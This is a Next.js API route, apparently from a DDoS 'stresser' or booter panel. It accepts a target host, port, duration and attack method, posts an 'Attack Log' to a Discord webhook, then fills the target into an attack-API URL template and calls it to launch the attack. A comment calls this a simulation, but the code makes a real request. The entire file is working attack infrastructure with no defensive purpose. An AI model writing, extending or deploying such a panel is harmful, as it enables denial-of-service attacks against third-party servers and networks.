import { NextResponse } from "next/server"
import { supabase } from "@/lib/supabase/client"

export async function POST(req: Request) {
  try {
    const { profileId, methodId, host, port, time, username, methodName, apiEndpoint } = await req.json()

    // Enviar log do ataque via Discord webhook
    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL
    if (!discordWebhookUrl) {
      return NextResponse.json({ error: "Discord webhook URL is not configured." }, { status: 500 })
    }

    await fetch(discordWebhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [
          {
            title: "Attack Log",
            color: 16711680,
            fields: [
              { name: "Username", value: username, inline: true },
              { name: "IP", value: host, inline: true },
              { name: "Method", value: methodName || "Unknown", inline: true },
              { name: "Port", value: port.toString(), inline: true },
              { name: "Time", value: `${time} seconds`, inline: true },
            ],
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    })

    // Simular chamada à API de ataque
    const resolvedApiEndpoint = apiEndpoint
      .replace("{HOST}", host)
      .replace("{PORT}", port.toString())
      .replace("{TIME}", time.toString())

    await fetch(resolvedApiEndpoint, { method: "GET" })

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error in attack API:", error)
    return NextResponse.json({ error: "Failed to process attack." }, { status: 500 })
  }
}
